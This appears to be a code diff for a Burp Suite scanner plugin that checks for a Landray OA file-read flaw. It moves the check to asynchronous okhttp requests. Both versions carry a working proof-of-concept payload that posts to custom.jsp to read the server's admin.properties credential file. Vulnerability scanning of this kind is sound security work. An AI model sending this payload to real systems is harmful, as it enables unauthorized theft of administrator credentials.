@@ -3,8 +3,13 @@ package burp.vuls;
 import burp.*;
 import burp.impl.VulResult;
 import burp.impl.VulTaskImpl;
+import burp.util.HttpRequestResponseFactory;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.Response;
+import org.jetbrains.annotations.NotNull;
 
-import java.util.Arrays;
+import java.io.IOException;
 import java.util.List;
 
 public class LandrayOa extends VulTaskImpl {
@@ -16,35 +21,36 @@ public class LandrayOa extends VulTaskImpl {
     @Override
     public VulResult run() {
         //新的请求包
-        String poc_req = "POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1\n" +
-                "Host: "+ host +"\n" +
-                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\n" +
-                "Content-Type: application/x-www-form-urlencoded\n" +
-                "Accept-Encoding: gzip\n" +
-                "\n";
+        String url = iHttpService.getProtocol() +"://"+ iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
         String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
-        IHttpRequestResponse messageInfo1 = requester.send(this.iHttpService, Arrays.asList(poc_req.split("\n")), poc_body.getBytes());
-        //新请求信息
-        IRequestInfo analyzeRequest = this.helpers.analyzeRequest(messageInfo1);
-        //新的返回包
-        IResponseInfo analyzeResponse1 = this.helpers.analyzeResponse(messageInfo1.getResponse());
-        String resp = new String(messageInfo1.getResponse());
-        String resp1_body = resp.substring(analyzeResponse1.getBodyOffset());
-        //新返回上面板信息
-        String path = analyzeRequest.getUrl().getPath();
-        String method = analyzeRequest.getMethod();
-        short status = analyzeResponse1.getStatusCode();
-
-        //如果状态码相同则可能存在问题
-        if (status == 200 && resp1_body.length() > 0) {
-            message = "LandrayOa Vul";
-            messageInfo_r = messageInfo1;
-        }
-
-        if (!message.equalsIgnoreCase("")){
-            result = logAdd(messageInfo_r, host, path, method, status, message, payloads);
-        }
+        //新请求
+        okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
 
         return result;
+    }
+}
+
+class LandrayOaCallback implements Callback {
+
+    VulTaskImpl vulTask;
+
+    public LandrayOaCallback(VulTaskImpl vulTask){
+        this.vulTask = vulTask;
+    }
+    @Override
+    public void onFailure(@NotNull Call call, @NotNull IOException e) {
+        vulTask.callbacks.printError("[LandrayOaCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
+    }
+
+    @Override
+    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
+        if (response.isSuccessful()){
+            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
+            // 检查响应体是否有内容
+            if (vulTask.ok_respBody.length() > 0) {
+                vulTask.message = "LandrayOa Vul";
+                vulTask.log();
+            }
+        }
     }
 }
